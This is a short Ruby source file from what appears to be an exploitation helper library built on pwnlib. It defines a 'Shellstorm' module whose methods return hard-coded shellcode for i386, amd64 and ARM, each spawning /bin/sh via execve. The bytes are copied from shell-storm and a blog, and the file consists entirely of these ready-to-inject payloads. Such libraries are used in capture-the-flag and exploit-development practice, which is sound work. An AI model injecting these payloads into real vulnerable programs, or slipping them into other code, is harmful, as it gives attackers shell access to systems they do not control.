# frozen_string_literal: true

require 'pwnlib/util/packing'

module Pwby
  module Shellstorm
    module I386
      def self.scanf_sh
        # https://hackhijack64.tistory.com/38
        shell = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
        return shell.unpack("C*").pack("C*") # IS THIS BEST?
      end
    end

    module Amd64
      # http://www.shell-storm.org/shellcode/files/shellcode-603.html
      def self.scanf_sh
        shell = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
        return shell.unpack("C*").pack("C*")
      end
    end

    module ARM
      def self.scanf_sh
        # http://www.shell-storm.org/shellcode/files/shellcode-904.html
        shell = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
        return shell.unpack("C*").pack("C*")
      end
    end
  end
end
